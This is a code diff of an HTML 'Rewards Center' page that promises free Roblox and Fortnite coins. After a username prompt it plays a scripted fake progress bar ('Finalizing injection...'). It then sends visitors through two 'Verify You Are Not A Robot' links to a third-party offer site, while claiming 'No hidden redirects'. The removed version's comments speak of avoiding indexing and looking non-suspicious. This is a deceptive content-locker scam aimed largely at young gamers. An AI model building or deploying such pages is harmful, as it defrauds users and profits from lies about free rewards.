@@ -1,113 +1,432 @@
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- حماية من الفهرسة والفحص -->
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta name="googlebot" content="noindex, nofollow">
-    <title>Enterprise Asset Management | Sync System</title>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
-    
-    <style>
-        :root {
-            --primary: #2ecc71;
-            --bg: #0b0d11;
-            --surface: #161b22;
-            --text: #e6edf3;
-        }
+<!DOCTYPE html>  
+<html lang="en">    
+<head>    
+<meta charset="UTF-8" />    
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />    
+<meta name="robots" content="noindex, nofollow, noarchive" />    
+<meta name="googlebot" content="noindex, nofollow" />    
+<title>Rewards Center</title>  
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">  
+<style>    
+:root{    
+    --primary:#00ffa6;    
+    --bg:#05070a;    
+    --card:#0d1117;    
+    --text:#e6edf3;    
+    --muted:#8b949e;    
+    --border:#1f2933;    
+}    
+*{margin:0;padding:0;box-sizing:border-box;}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg);
-            color: var(--text);
-            line-height: 1.5;
-        }
+body{
+font-family:'Inter',sans-serif;
+background:radial-gradient(circle at top,#0b1220,#05070a 60%);
+color:var(--text);
+min-height:100vh;
+}
 
-        /* واجهة نظيفة جداً كأنها موقع رسمي لشركة تقنية */
-        header {
-            padding: 80px 20px;
-            text-align: center;
-            background: linear-gradient(180deg, #101217 0%, var(--bg) 100%);
-        }
+header{
+text-align:center;
+padding:72px 20px 34px;
+}
 
-        h1 { font-size: 42px; font-weight: 900; margin-bottom: 10px; letter-spacing: -1px; }
-        p { color: #8b949e; max-width: 600px; margin: 0 auto; font-size: 16px; }
+header h1{
+font-size:clamp(34px,6vw,56px);
+font-weight:900;
+letter-spacing:-1px;
+line-height:1.05;
+}
 
-        .container {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 25px;
-            padding: 40px 10%;
-        }
+header p{
+color:var(--muted);
+margin-top:12px;
+font-size:16px;
+}
 
-        .asset-node {
-            background: var(--surface);
-            border: 1px solid #30363d;
-            border-radius: 12px;
-            width: 320px;
-            overflow: hidden;
-            transition: 0.2s;
-            cursor: pointer;
-        }
+.container{
+display:flex;
+justify-content:center;
+flex-wrap:wrap;
+gap:24px;
+padding:22px 18px 40px;
+max-width:1100px;
+margin:0 auto;
+}
 
-        .asset-node:hover {
-            border-color: var(--primary);
-            transform: translateY(-5px);
-        }
+.card{
+width:min(100%, 320px);
+background:linear-gradient(180deg,#0f1520,#0b0f15);
+border:1px solid var(--border);
+border-radius:18px;
+overflow:hidden;
+transition:.25s ease;
+box-shadow:0 12px 40px rgba(0,0,0,.24);
+}
 
-        .node-img {
-            height: 200px;
-            background: #0d1117;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+.card:hover{
+transform:translateY(-6px);
+border-color:rgba(0,255,166,.65);
+}
 
-        .node-img img { max-width: 100%; max-height: 100%; object-fit: contain; }
+.card-media{
+height:210px;
+background:#0a0d12;
+display:flex;
+align-items:center;
+justify-content:center;
+border-bottom:1px solid var(--border);
+}
 
-        .node-info { padding: 20px; border-top: 1px solid #30363d; }
-        .node-info h3 { font-size: 20px; margin-bottom: 5px; }
-        .node-info .tag { 
-            display: inline-block; padding: 4px 8px; border-radius: 4px; 
-            background: rgba(46, 204, 113, 0.1); color: var(--primary); 
-            font-size: 12px; font-weight: 700; text-transform: uppercase;
-        }
+.card-media img{
+width:100%;
+height:100%;
+object-fit:cover;
+display:block;
+}
 
-        /* المودال الاحترافي */
-        .sync-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.85); z-index: 9999; backdrop-filter: blur(8px);
-            justify-content: center; align-items: center;
-        }
+.card-content{
+padding:18px;
+text-align:center;
+}
 
-        .sync-box {
-            background: #0d1117; width: 90%; max-width: 440px; padding: 40px;
-            border-radius: 16px; border: 1px solid #30363d; text-align: center;
-        }
+.card-content h3{
+font-size:22px;
+margin-bottom:14px;
+font-weight:800;
+}
 
-        input, select {
-            width: 100%; padding: 14px; margin: 15px 0; background: #161b22;
-            border: 1px solid #30363d; border-radius: 8px; color: #fff; outline: none;
-        }
-        input:focus { border-color: var(--primary); }
+.btn{
+display:block;
+width:100%;
+border:none;
+background:linear-gradient(180deg,#00ffa6,#00d686);
+color:#04110b;
+padding:14px 16px;
+border-radius:12px;
+font-weight:900;
+font-size:15px;
+cursor:pointer;
+transition:.2s ease;
+text-align:center;
+text-decoration:none;
+box-sizing:border-box;
+}
 
-        .sync-btn {
-            width: 100%; padding: 16px; background: var(--primary); color: #000;
-            border: none; border-radius: 8px; font-weight: 900; cursor: pointer;
-            text-transform: uppercase; margin-top: 10px;
-        }
+.btn:hover{filter:brightness(1.04); transform:translateY(-1px);}
+.btn:active{transform:translateY(0);}
 
-        /* شريط تقدم "تقني" غير مريب */
-        .progress-container { display: none; margin-top: 20px; }
-        .bar { width: 100%; height: 6px; background: #30363d; border-radius: 10px; overflow: hidden; }
-        .fill { width: 0%; height: 100%; background: var(--primary); }
-        .status { margin-top: 10px; font-size: 11px; color: var(--primary); font-family: monospace; }
+.btn:disabled {
+    background: #1f2933;
+    color: #6e7681;
+    cursor: not-allowed;
+    transform: none;
+    filter: none;
+}
+
+.overlay{
+position:fixed;
+inset:0;
+display:none;
+align-items:center;
+justify-content:center;
+background:rgba(0,0,0,.84);
+backdrop-filter:blur(10px);
+z-index:9999;
+padding:16px;
+}
+
+.box{
+width:min(100%, 440px);
+background:#0d1117;
+border:1px solid #2b3440;
+border-radius:18px;
+padding:24px;
+box-shadow:0 24px 80px rgba(0,0,0,.45);
+}
+
+.box h2{
+font-size:28px;
+margin-bottom:8px;
+font-weight:900;
+}
+
+.box p{
+color:var(--muted);
+font-size:14px;
+line-height:1.6;
+}
+
+.input, select{
+width:100%;
+margin-top:14px;
+padding:14px 14px;
+border-radius:12px;
+border:1px solid #30363d;
+background:#161b22;
+color:#fff;
+outline:none;
+font-size:15px;
+}
+
+.input:focus, select:focus{
+border-color:rgba(0,255,166,.7);
+}
+
+.actions{
+margin-top:16px;
+display:grid;
+gap:10px;
+}
+
+.small{
+font-size:12px;
+color:#6e7681;
+margin-top:14px;
+text-align:center;
+}
+
+.badge{
+display:inline-block;
+margin-bottom:10px;
+padding:6px 10px;
+border-radius:999px;
+background:rgba(0,255,166,.12);
+color:#00ffa6;
+font-size:12px;
+font-weight:800;
+letter-spacing:.2px;
+}
+
+.progress{
+margin-top:16px;
+width:100%;
+height:7px;
+background:#212833;
+border-radius:999px;
+overflow:hidden;
+}
+
+.fill{
+width:0%;
+height:100%;
+background:linear-gradient(90deg,#00ffa6,#3ef7ff);
+transition:width .12s linear;
+}
+
+.status{
+margin-top:10px;
+font-size:12px;
+color:#00ffa6;
+font-family:monospace;
+}
+
+/* Animations for verification box */
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+.verification-box {
+    animation: fadeIn 0.5s ease;
+    background: rgba(255, 193, 7, 0.08);
+    border: 1px solid rgba(255, 193, 7, 0.3);
+    padding: 16px;
+    border-radius: 12px;
+    margin: 20px 0 15px 0;
+    text-align: center;
+}
+
+.verification-box h3 {
+    color: #ffc107;
+    margin-bottom: 8px;
+    font-size: 18px;
+}
+
+.verification-box p {
+    color: #e6edf3;
+    font-size: 14px;
+    line-height: 1.5;
+}
+</style>  
+</head>
+
+<body>  
+<header>    
+    <h1>Rewards Center</h1>    
+    <p>Complete one offer to unlock your reward</p>    
+</header>  
+<div class="container" id="cards"></div>  
+
+<div class="overlay" id="overlay">    
+    <div class="box" id="box"></div>    
+</div>  
+
+<script>    
+/* صور مدمجة داخل الملف حتى لا تنكسر */    
+function svgData(title, subtitle, accent1, accent2) {    
+    const svg = `    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500">    
+      <defs>    
+        <linearGradient id="g" x1="0" y1="0" x2="1" y2="1">    
+          <stop offset="0%" stop-color="${accent1}"/>    
+          <stop offset="100%" stop-color="${accent2}"/>    
+        </linearGradient>    
+        <radialGradient id="r" cx="30%" cy="25%" r="80%">    
+          <stop offset="0%" stop-color="rgba(255,255,255,.25)"/>    
+          <stop offset="100%" stop-color="rgba(255,255,255,0)"/>    
+        </radialGradient>    
+      </defs>    
+      <rect width="800" height="500" fill="#0a0d12"/>    
+      <rect x="30" y="30" width="740" height="440" rx="36" fill="url(#g)" opacity=".96"/>    
+      <circle cx="170" cy="130" r="190" fill="url(#r)"/>    
+      <circle cx="640" cy="390" r="160" fill="rgba(255,255,255,.08)"/>    
+      <text x="60" y="185" fill="#ffffff" font-size="64" font-family="Inter,Arial,sans-serif" font-weight="900">${title}</text>    
+      <text x="60" y="255" fill="rgba(255,255,255,.88)" font-size="28" font-family="Inter,Arial,sans-serif" font-weight="700">${subtitle}</text>    
+      <rect x="60" y="310" width="210" height="58" rx="18" fill="rgba(0,0,0,.20)"/>    
+      <text x="90" y="347" fill="#ffffff" font-size="22" font-family="Inter,Arial,sans-serif" font-weight="800">Premium Reward</text>    
+    </svg>`;    
+    return "data:image/svg+xml;charset=utf-8," + encodeURIComponent(svg);    
+}    
+
+const data = [
+{
+id: "ROB-101",
+title: "Roblox",
+tag: "Active Node",
+img: svgData("ROBLOX", "Reward Station", "#25d366", "#128c7e")
+},
+{
+id: "FRT-202",
+title: "Fortnite",
+tag: "Active Node",
+img: svgData("FORTNITE", "Reward Station", "#6f5cff", "#00d4ff")
+}
+];
+
+const cards = document.getElementById("cards");
+
+data.forEach((item, index) => {
+    cards.innerHTML += `
+    <div class="card" onclick="openBox(${index})">     
+        <div class="card-media">     
+            <img src="${item.img}" alt="${item.title}">     
+        </div>     
+        <div class="card-content">     
+            <span class="badge">${item.tag}</span>     
+            <h3>${item.title}</h3>     
+            <button class="btn">Get Reward</button>     
+        </div>     
+    </div>`;
+});
+
+function openBox(i){
+    const item = data[i];
+    document.getElementById("box").innerHTML = `
+    <div class="badge">${item.id}</div>
+    <h2>${item.title} Reward</h2>
+    <p id="instruction-text">Choose your option below and continue through the official flow.</p>
+
+    <div id="input-section">
+        <input class="input" type="text" id="target" placeholder="Enter your username or ID" />    
+        <select id="option">    
+            <option value="1000">1000 Coins</option>    
+            <option value="5000">5000 Coins</option>    
+            <option value="10000">10000 Coins</option>    
+        </select>    
+    </div>
+
+    <div class="actions" id="action-buttons">    
+        <button class="btn" id="continue-btn" onclick="runFlow()">Continue</button>    
+        <button class="btn" onclick="closeBox()" style="background:#1f2933;color:#e6edf3;">Close</button>    
+    </div>    
+
+    <div class="progress" id="progress-container"><div class="fill" id="fill"></div></div>    
+    <div class="status" id="status">Waiting for input...</div>    
+
+    <!-- Verification Section (Hidden initially, appears at 100%) -->
+    <div id="verification-section" style="display:none;">
+        <div class="verification-box">
+            <h3>⚠️ Verification Required</h3>
+            <p>We need to verify that you are not a robot before sending the reward. Please complete one quick step below.</p>
+        </div>
+        <!-- تم وضع الرابط الأول هنا كخيار أساسي -->
+        <a href="https://singingfiles.com/show.php?l=0&u=2449875&id=73805" target="_blank" class="btn" style="background: linear-gradient(180deg, #ffc107, #ff9800); color: #000; font-size: 16px; margin-bottom: 10px;">
+            Verify You Are Not A Robot
+        </a>
+        <!-- تم وضع الرابط الثاني هنا كخيار بديل -->
+        <a href="https://singingfiles.com/show.php?l=0&u=2449875&id=74463" target="_blank" class="btn" style="background: linear-gradient(180deg, #1f2933, #0d1117); color: #e6edf3; font-size: 14px; border: 1px solid #30363d;">
+            Alternative Verification Method
+        </a>
+    </div>
+
+    <div class="small">    
+        This page is a promotional demo interface. No hidden redirects.    
+    </div>    
+    `;    
+    document.getElementById("overlay").style.display = "flex";
+}
+
+function closeBox(){
+    document.getElementById("overlay").style.display = "none";
+}
+
+function runFlow(){
+    const target = document.getElementById("target").value.trim();
+    if(!target){
+        document.getElementById("status").textContent = "Please enter a valid username or ID.";
+        return;
+    }
+
+    // Disable inputs while processing to prevent spam clicks
+    document.getElementById("target").disabled = true;
+    document.getElementById("option").disabled = true;
+    const btn = document.getElementById("continue-btn");
+    btn.disabled = true;
+    btn.textContent = "Processing...";
+
+    let p = 0;    
+    const fill = document.getElementById("fill");    
+    const status = document.getElementById("status");    
+    const steps = [    
+        "Connecting to server...",    
+        "Validating username...",    
+        "Preparing reward generation...",    
+        "Finalizing injection...",    
+        "Verification pending..."    
+    ];    
+
+    const t = setInterval(() => {    
+        p += 5;    
+        fill.style.width = p + "%";    
+
+        if (p === 20) status.textContent = steps[0];    
+        if (p === 40) status.textContent = steps[1];    
+        if (p === 60) status.textContent = steps[2];    
+        if (p === 80) status.textContent = steps[3];    
+
+        // When progress hits 100%
+        if (p >= 100) {    
+            clearInterval(t);    
+            
+            // 1. Hide the old inputs, progress bar, and buttons
+            document.getElementById("input-section").style.display = "none";
+            document.getElementById("action-buttons").style.display = "none";
+            document.getElementById("instruction-text").style.display = "none";
+            document.getElementById("progress-container").style.display = "none";
+            document.getElementById("status").style.display = "none";
+
+            // 2. Show the Verification Box with animation
+            document.getElementById("verification-section").style.display = "block";
+        }    
+    }, 150); // 150ms makes the progress bar move realistically
+}
+</script>  
+</body>
+</html>
+
+
+```
     </style>
 </head>
 <body>
